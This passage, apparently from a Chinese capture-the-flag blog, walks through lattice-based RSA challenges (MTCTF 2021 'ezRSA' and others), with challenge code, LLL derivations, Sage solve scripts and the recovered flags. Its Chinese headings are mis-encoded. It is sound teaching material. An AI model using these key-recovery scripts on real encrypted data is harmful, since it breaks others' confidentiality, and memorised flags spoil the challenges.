class="base"><span class="strut" style="height:1.058548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">âˆ’</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mclose">)</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">âˆ’</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mclose">)</span></span></span></span></span></p><h2 id="exp-22"><a class="markdownIt-Anchor" href="#exp-22"></a> exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br>h = <span class="hljs-number">3967900409518491437091166715380802161532841159072519563471354336400750930009970177101953304861954502146570721506995224520631716261108071684882841102381144720177664434981608584075201907891964214604246219441325377602163957172642582158192223452845671007585556951922415200415538060247456213608112360361636912703380306386439846269645696750929811607783895294670639202472465920599542568227657152922843001792754116981992696203788298740550812661583820191877594185184758074771316815650833195023325150218113883046328740408517222933980589974912467363367727038230703152354450353199257411964288022409128890352346036423792759938468964462267528727695183747947515480432786669353434638860350849296620606820894819933050645748656981993408399675189724419997805599649975500093890450393421897803267909569938850674774386012819838940544502656293639875120854745249463561940935651895728242282430164407574626178693654713011323376912585958110558532953333</span><br>p = <span class="hljs-number">4407206782832544188667944201727813617189883940490534227436068867901196311508151544316989531306678865408607390128649278629254128753967046691736522108356971272311308455619879297358588727267184200777923695048248757115057072357087881336680504033511958280710547178971268670442650871890760916203109226852889599638484429889898210426540567794020013920566784973281560628666918122674783539653720295629054898529900882965691587718212291373734218555167591690910246380516121338139063419587750344469214004539520017140593342859857394308703001939640899189432836134392830208318268131639318655382175643272565186884496188876341460968563623529229713790076050095498053846983536874648190033735162809614805624209827336432223553914651838063614534617044557310972056169869738746432924853953258079006936103497626054364115282007843847693813896856977882285910369660539092462408790126385881581833165309032853389777355480169212478669139225609058338565029211</span><br>c = <span class="hljs-number">4052491539376955553220568757544621659293304958837707160681090710624505862889512520190589879197831394720145909992216099963759496125523078969015706069688556356682711471641851937470179182960755800968587551608595725470945584970094036299764623894583379909329996337429067328575804567222496890803396234507278490116354758303807070775249711087938549824010697869930856205244006491475201993228121418890520174179969294094963249013786611889790711801269524919695653453576043288934196952437164829830756439734795068980207758771052483500272264363028346668629397497794792110170275173209377114274164087320163340547019935562316429227119346802124620682293405375798340275679831750482339301440428527223801872439611461272229275824994734898078664180541096159146759378804836952981089673755590353588900522455968721971944276318473421193690310601002295637581030417570868955379815661133148339565983621730401675643094909263098778572081973142223744746526672</span><br><br>L = matrix(ZZ, [[<span class="hljs-number">1</span>, h],[<span class="hljs-number">0</span>, p]])<br>v = L.LLL()[<span class="hljs-number">0</span>]<br>f, g = <span class="hljs-built_in">map</span>(<span class="hljs-built_in">abs</span>, v)<br>m = ((f*c%p)*invert(f*f,g))%g<br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br><span class="hljs-comment">#b&#x27;Sangfor&#123;pfa2s1f65ads4fwev1s2d3v1cxxavqes&#125;&#x27;</span><br><span class="hljs-comment">#NSSCTF&#123;pfa2s1f65ads4fwev1s2d3v1cxxavqes&#125;</span><br></code></pre></td></tr></table></figure><h1 id="mtctf-2021-finalezrsa"><a class="markdownIt-Anchor" href="#mtctf-2021-finalezrsa"></a> [MTCTF 2021 final]ezRSA</h1><h2 id="é¢˜ç›®-23"><a class="markdownIt-Anchor" href="#é¢˜ç›®-23"></a> é¢˜ç›®\</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>m = bytes_to_long(flag)<br>p = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br>e = <span class="hljs-number">65537</span><br>n = p * q<br>c = <span class="hljs-built_in">pow</span>(m, e, n)<br><br>s = getPrime(<span class="hljs-number">256</span>)<br>M = getPrime(<span class="hljs-number">5048</span>)<br>hint = (p - <span class="hljs-number">297498275426</span>) * inverse(s, M) % M<br>t = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;message.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>)<br>t.write(<span class="hljs-string">f&quot;e = <span class="hljs-subst">&#123;e&#125;</span>\nc = <span class="hljs-subst">&#123;c&#125;</span>\nn = <span class="hljs-subst">&#123;n&#125;</span>\nM = <span class="hljs-subst">&#123;M&#125;</span>\nhint = <span class="hljs-subst">&#123;hint&#125;</span>\n&quot;</span>)<br>t.close()<br><span class="hljs-string">&quot;&quot;&quot;e = 65537</span><br><span class="hljs-string">c = 11223534598141520071392544441952727165225232358333005778273904279807651365082135278999006409297342081157139972503703772556228315654837441044781410960887536342197257046095815516053582104516752168718754752274252871063410625756822861003235434929734796245933907621657696650609132419469456238860601166224944487116</span><br><span class="hljs-string">n = 99499509473364452726944770421623721217675378717234178828554602484867641740497277374806036356486848621495917213623425604565104435195783450029879177770305417469850119739921527698744700219067563802483159458398895082044997907953256062342593605652927874232404778144112740505724215742062859322375891810785229735653</span><br><span class="hljs-string">M = 28858066896535909755146975040720031655813099454455588895434479778600245612915775220883088811806723015938061791264869678085304248608125313205719043320256733514389739252845381708094678596099621503299764646358765107958130065721737938646850422959290465490270263553423913213684958592738500488797707239673645370968467090153285601432966586133693641854092761919184904521240074718850103356119966387029699913571443658384564840234765103070736676067458391659605655580766436276719610283460962533141261830775028138998594269732067550977245136631815804641115446066102981044849495663224005844657686979516481904043008222498344271373989609634617315702887646444506965035406154183377067490922195507071571055579654138590566650703038341939225657159668601565182939447340585110418258653618384852356058444795156595720943362884361136229430356254095673818462046182310826133487611183265532844700265640889105864909560170846171486510513240630480729194415061752698286990999064594811803482429976978688266632277914610443963726561921790718480343488391563503774868490108659902216386976683532579945706490286814310031310144410303859633785939399012605326754445715302492704458881700872467560968264583996658711892595658439058034434031646411995511168849724976850557976639662545139917517675296224197763447929417263845949813741362574641118781293171167041592771305352186419565096347024619027397784780864922205105185970180629777320680707022011697404359388540366320053501502698747763307336114482530784826238326983596966436776918503653153420281803168537703048371580451</span><br><span class="hljs-string">hint = 24302462761412867722556483860201357169283131384498485449193507018526006760633350601593235386242712333885826513399701577522498685938541691414316724804357523659514319083860507720945068584985970098437482386854188516742033184163273293005356970701527614010961471490166306765208284126815267752826036846338185010168551115391901008731195800723630612524215610302192763771954146943262822909368086155537366851998954401585888789660061750804720858175620022924944428882337005545535959410243692854073069775794945154943244522898330286785483043492678802461244624116832548150221211726044545331789932659966539042635768789637635754297830131948383991027466194455817875377950516103513735000718642093769229006510961952865719649517629939801014585849419818774317178973918720330390674833583065434312010539617630210110724391629534996688713945139529416075521015600392479980677759342058040778532467875961508475990300178277703011765698425360329342396347848373844031930655143343217447877587074485794273364964346235973542157189093330870952677683308479410235841331914353677363106473914986073397716367455628483060709281215783434084559550690248426391913205234184130354155776334292729262232484610747771114078013979494659835579574006801652858265173309736540235377076956677464263798132149783780830729103485354096234062135454873557941791812722418582207577124971978987895472250326100927372068822672582017222521124179752698654114839303426099426224351872025466618402675104161895600513776962289703455252021742990686505176582638132300246212598903123706906104217087</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><h2 id="åˆ†æ-23"><a class="markdownIt-Anchor" href="#åˆ†æ-23"></a> åˆ†æ</h2><p>æˆ‘ä»¬çŸ¥é“ï¼š</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>h</mi><mi>i</mi><mi>n</mi><mi>t</mi><mo>=</mo><mo stretchy="false">(</mo><mi>p</mi><mo>âˆ’</mo><mi>a</mi><mo stretchy="false">)</mo><mo>âˆ—</mo><msup><mi>s</mi><mrow><mo>âˆ’</mo><mn>1</mn></mrow></msup><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>M</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">hint=(p-a)*s^{-1}\quad mod(M)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">âˆ’</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mclose">)</span></span></span></span></span></p><p>å°†p-aå½“ä½œä¸€ä¸ªæ•´ä½“</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>h</mi><mi>i</mi><mi>n</mi><mi>t</mi><mo>âˆ—</mo><mi>s</mi><mo>=</mo><mi>p</mi><mo>+</mo><mi>k</mi><mo>âˆ—</mo><mi>M</mi><mspace linebreak="newline"></mspace><mi>p</mi><mo>=</mo><mi>h</mi><mi>i</mi><mi>n</mi><mi>t</mi><mo>âˆ—</mo><mi>s</mi><mo>+</mo><mi>k</mi><mo>âˆ—</mo><mi>M</mi><mspace linebreak="newline"></mspace><mtext>æ„é€ æ ¼</mtext><mi>L</mi><mo>=</mo><mo stretchy="false">(</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mrow><mi>h</mi><mi>i</mi><mi>n</mi><mi>t</mi></mrow></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>M</mi></mstyle></mtd></mtr></mtable><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mo stretchy="false">(</mo><mi>s</mi><mo separator="true">,</mo><mi>k</mi><mo stretchy="false">)</mo><mi>L</mi><mo>=</mo><mo stretchy="false">(</mo><mi>s</mi><mo separator="true">,</mo><mi>p</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">hint*s=p+k*M\\p=hint*s+k*M\\æ„é€ æ ¼L=(\begin{matrix}1 &amp; hint\\0 &amp; M\end{matrix})\\(s,k)L=(s,p)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">s</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">æ„</span><span class="mord cjk_fallback">é€ </span><span class="mord cjk_fallback">æ ¼</span><span class="mord mathnormal">L</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.4000000000000004em;vertical-align:-0.9500000000000004em;"></span><span class="mopen">(</span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.45em;"><span style="top:-3.61em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">h</span><span class="mord mathnormal">i</span><span class="mord mathnormal">n</span><span class="mord mathnormal">t</span></span></span><span style="top:-2.4099999999999997em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.9500000000000004em;"><span></span></span></span></span></span></span></span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">)</span><span class="mord mathnormal">L</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mclose">)</span></span></span></span></span></p><h2 id="exp-23"><a class="markdownIt-Anchor" href="#exp-23"></a> exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">11223534598141520071392544441952727165225232358333005778273904279807651365082135278999006409297342081157139972503703772556228315654837441044781410960887536342197257046095815516053582104516752168718754752274252871063410625756822861003235434929734796245933907621657696650609132419469456238860601166224944487116</span><br>n = <span class="hljs-number">99499509473364452726944770421623721217675378717234178828554602484867641740497277374806036356486848621495917213623425604565104435195783450029879177770305417469850119739921527698744700219067563802483159458398895082044997907953256062342593605652927874232404778144112740505724215742062859322375891810785229735653</span><br>M = <span class="hljs-number">28858066896535909755146975040720031655813099454455588895434479778600245612915775220883088811806723015938061791264869678085304248608125313205719043320256733514389739252845381708094678596099621503299764646358765107958130065721737938646850422959290465490270263553423913213684958592738500488797707239673645370968467090153285601432966586133693641854092761919184904521240074718850103356119966387029699913571443658384564840234765103070736676067458391659605655580766436276719610283460962533141261830775028138998594269732067550977245136631815804641115446066102981044849495663224005844657686979516481904043008222498344271373989609634617315702887646444506965035406154183377067490922195507071571055579654138590566650703038341939225657159668601565182939447340585110418258653618384852356058444795156595720943362884361136229430356254095673818462046182310826133487611183265532844700265640889105864909560170846171486510513240630480729194415061752698286990999064594811803482429976978688266632277914610443963726561921790718480343488391563503774868490108659902216386976683532579945706490286814310031310144410303859633785939399012605326754445715302492704458881700872467560968264583996658711892595658439058034434031646411995511168849724976850557976639662545139917517675296224197763447929417263845949813741362574641118781293171167041592771305352186419565096347024619027397784780864922205105185970180629777320680707022011697404359388540366320053501502698747763307336114482530784826238326983596966436776918503653153420281803168537703048371580451</span><br>hint = <span class="hljs-number">24302462761412867722556483860201357169283131384498485449193507018526006760633350601593235386242712333885826513399701577522498685938541691414316724804357523659514319083860507720945068584985970098437482386854188516742033184163273293005356970701527614010961471490166306765208284126815267752826036846338185010168551115391901008731195800723630612524215610302192763771954146943262822909368086155537366851998954401585888789660061750804720858175620022924944428882337005545535959410243692854073069775794945154943244522898330286785483043492678802461244624116832548150221211726044545331789932659966539042635768789637635754297830131948383991027466194455817875377950516103513735000718642093769229006510961952865719649517629939801014585849419818774317178973918720330390674833583065434312010539617630210110724391629534996688713945139529416075521015600392479980677759342058040778532467875961508475990300178277703011765698425360329342396347848373844031930655143343217447877587074485794273364964346235973542157189093330870952677683308479410235841331914353677363106473914986073397716367455628483060709281215783434084559550690248426391913205234184130354155776334292729262232484610747771114078013979494659835579574006801652858265173309736540235377076956677464263798132149783780830729103485354096234062135454873557941791812722418582207577124971978987895472250326100927372068822672582017222521124179752698654114839303426099426224351872025466618402675104161895600513776962289703455252021742990686505176582638132300246212598903123706906104217087</span><br><br>L = matrix(ZZ, [[<span class="hljs-number">1</span>, hint],[<span class="hljs-number">0</span>, M]])<br>v = L.LLL()<br>v = v[<span class="hljs-number">0</span>]<br>s, p = <span class="hljs-built_in">map</span>(<span class="hljs-built_in">abs</span>, v)<br>p=p+<span class="hljs-number">297498275426</span><br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">pow</span>(c,invert(e,(p-<span class="hljs-number">1</span>)*(n//p-<span class="hljs-number">1</span>)),n))))<br><span class="hljs-comment">#b&#x27;flag&#123;388bb794-ccda-f02e-79c6-8e44659c2481&#125;&#x27;</span><br><span class="hljs-comment">#NSSCTF&#123;388bb794-ccda-f02e-79c6-8e44659c2481&#125;</span><br></code></pre></td></tr></table></figure><h1 id="ç¾ŠåŸæ¯-2021easy_rsa"><a class="markdownIt-Anchor" href="#ç¾ŠåŸæ¯-2021easy_rsa"></a> [ç¾ŠåŸæ¯ 2021]Easy_Rsa</h1><h2 id="é¢˜ç›®-24"><a class="markdownIt-Anchor" href="#é¢˜ç›®-24"></a> é¢˜ç›®</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span 